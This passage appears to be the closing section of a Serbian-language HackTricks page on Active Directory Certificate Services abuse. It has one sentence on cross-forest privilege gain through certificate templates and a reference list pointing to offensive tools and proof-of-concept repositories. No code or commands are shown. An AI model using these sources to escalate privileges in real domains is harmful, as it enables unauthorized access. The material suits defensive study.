Oba scenarija dovode do **povećanja attack surface-a** iz jednog forest-a u drugi. Napadač bi mogao da iskoristi podešavanja certificate template-a za dobijanje dodatnih privilegija u stranom domenu.<sup>[[6]](#references)</sup>


## Reference

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
